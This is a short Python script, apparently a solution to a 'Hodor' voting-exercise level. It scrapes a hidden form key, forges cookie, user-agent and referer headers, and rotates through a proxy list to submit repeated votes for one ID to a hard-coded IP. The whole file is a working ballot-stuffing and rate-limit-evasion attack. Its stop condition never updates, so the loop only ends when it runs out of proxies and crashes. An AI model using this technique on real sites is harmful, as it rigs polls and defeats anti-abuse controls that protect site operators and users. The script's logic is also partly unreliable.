#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import time

URL = 'http://158.69.76.135/level4.php'
ID = '2500'

with open('proxies.txt', 'r') as f:
    proxies = [line.strip() for line in f]

check = ID + "    </td>\n    <td>\n98"

r = requests.get(URL)
soup = BeautifulSoup(r.text, 'html.parser')

key = soup.find('input', {'name': 'key'}).get('value')
payload = {'id': ID, 'holdthedoor': 'submit', 'key': key}
headers = {
    'Cookie': 'HoldTheDoor=' + key,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
    'Referer': URL
}

i = 200
while check not in r.text:
    proxy = {
        'http': "http://" + proxies[i]
    }
    print(proxy)
    try:
        response = requests.post(
            URL, data=payload, headers=headers, proxies=proxy, timeout=1)
        print(response.text)
    except:
        pass
    i += 1

print("Done")
